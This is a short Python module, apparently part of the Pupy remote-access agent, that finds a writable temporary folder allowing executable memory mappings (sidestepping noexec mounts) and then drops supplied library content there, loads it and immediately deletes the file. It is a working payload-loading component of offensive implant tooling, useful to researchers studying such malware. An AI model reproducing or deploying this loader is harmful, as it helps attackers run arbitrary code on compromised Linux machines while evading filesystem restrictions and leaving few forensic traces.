# -*- coding: utf-8 -*-

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals
__all__ = (
    '_does_dest_allows_executable_mappings',
    'load_content'
)


from os import unlink, fdopen
from tempfile import mkstemp
from mmap import mmap, PROT_WRITE
try:
    from mmap import PROT_EXEC
except:
    #mmap from rustc is missing PROT_EXEC ??
    PROT_EXEC=4

import pupy.agent as pupy

from .utils import load_library_common, find_writable_folder


def _does_dest_allows_executable_mappings(folder):
    try:
        fd, tmp_file = mkstemp(prefix='.so', dir=folder)
    except OSError as e:
        pupy.dprint('Folder {} is not accessible: {}', folder, e)
        return False

    try:
        fileobj = fdopen(fd, 'wb')
        fileobj.truncate(4096)
        mapping = mmap(fileobj.fileno(), 4096, prot=PROT_WRITE | PROT_EXEC)
        mapping.close()
        pupy.dprint('Folder {} does allows executables', folder)
        return True

    except IOError as e:
        pupy.dprint('Exception during mmap {}', e)
        return False

    except OSError as e:
        pupy.dprint('Folder {} does not allow executables: {}', folder, e)
        return False

    finally:
        try:
            unlink(tmp_file)
        except OSError:
            pass


DROP_DIR = find_writable_folder(
    ['/tmp', '/var/tmp'],
    validate=_does_dest_allows_executable_mappings
)


def load_content(content, name, dlopen=False, initfuncname=None):
    fd, filepath = mkstemp(dir=DROP_DIR)
    try:
        return load_library_common(
            fd, filepath, content, name, dlopen, initfuncname
        )
    finally:
        unlink(filepath)
        fd.close()
